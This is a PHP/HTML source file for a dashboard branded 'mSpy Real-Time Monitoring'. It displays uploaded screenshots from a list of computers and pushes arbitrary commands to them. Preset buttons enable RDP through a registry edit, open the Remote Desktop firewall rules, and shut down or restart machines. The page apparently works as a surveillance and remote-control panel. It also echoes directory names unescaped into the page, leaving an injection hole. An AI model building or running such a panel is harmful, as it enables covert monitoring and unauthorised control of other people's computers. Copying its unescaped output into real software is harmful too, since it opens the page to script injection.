<?php
// PHP code to scan the "uploads/" directory and get the subdirectories
$uploads_dir = "uploads/";
$directories = [];

if ($handle = opendir($uploads_dir)) {
    while (($entry = readdir($handle)) !== false) {
        $path = $uploads_dir . $entry;
        // Check if it's a directory and not "." or ".."
        if (is_dir($path) && $entry != "." && $entry != "..") {
            $directories[] = $entry;
        }
    }
    closedir($handle);
}

// Set the first directory by default if available
$defaultDir = isset($directories[0]) ? $directories[0] : '';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real-Time Monitoring mSpy</title>
    <link rel="stylesheet" type="text/css" href="Style/app.css?t=20"/>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <script>
        let currentDir = '<?php echo $defaultDir; ?>';
    </script>
    <h1>
        <div class="logo">
            <span class="m">m</span>Spy
            <span class="underline"></span>
        </div>
        Real-Time Monitoring
    </h1>

    <div class="container">
        <!-- Left Sidebar for Folder List -->
        <div id="directory-list">
            <h3>Computers :</h3>
            <?php foreach ($directories as $dir): ?>
                <a href="javascript:void(0);" onclick="changeImage('<?php echo $dir; ?>')"><?php echo $dir; ?></a>
            <?php endforeach; ?>
        </div>

        <!-- Image Container for Displaying Screenshot -->
        <div id="image-container">
            <img id="screenshot" src="uploads/<?php echo $defaultDir; ?>/ScreenShot.jpg" alt="Screenshot">
            <div class="command-container">
                <input type="text" id="RequestCommand" placeholder="Enter Command">
                <button id="PushCommand" onclick='PushCommand()'>Push</button>
                <textarea id="RespondCommand" placeholder="Response..." readonly ></textarea> 
            </div>                       
        </div>
        
        <!-- Right Sidebar for Command List reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f -->
        <div id="command-list">
            <a href="javascript:void(0);" onclick='PushCommand("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f")'>Enable RDP</a>
            <a href="javascript:void(0);" onclick='PushCommand("netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=Yes")'>Enable Firewall RDP</a>
            <a href="javascript:void(0);" onclick='PushCommand("reg add \"HKLM\System\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f")'>Disable RDP</a>
            <a href="javascript:void(0);" onclick='PushCommand("rasdial \"Mahsen\"")'>ConnectVPN</a>
            <a href="javascript:void(0);" onclick='PushCommand("rasdial \"Mahsen\" /disconnect")'>DisconnectVPN</a>
            <a href="javascript:void(0);" onclick='PushCommand("ping 8.8.8.8 -n 1")'>Ping 8.8.8.8</a>
            <a href="javascript:void(0);" onclick='PushCommand("shutdown /s /t 0")'>Shutdown</a>
            <a href="javascript:void(0);" onclick='PushCommand("shutdown /r /t 0")'>Restart</a>
            <a href="javascript:void(0);" onclick='PushCommand("shutdown /l")'>SignOut</a>
        </div>

    </div>
    
    <script type="text/javascript" src="Script/app.js?t=39"></script>

    <div class="footer" style="background-color: #333; color: #fff; bottom: 0px; position: absolute;"> v1.20250219</div>
</body>
</html>
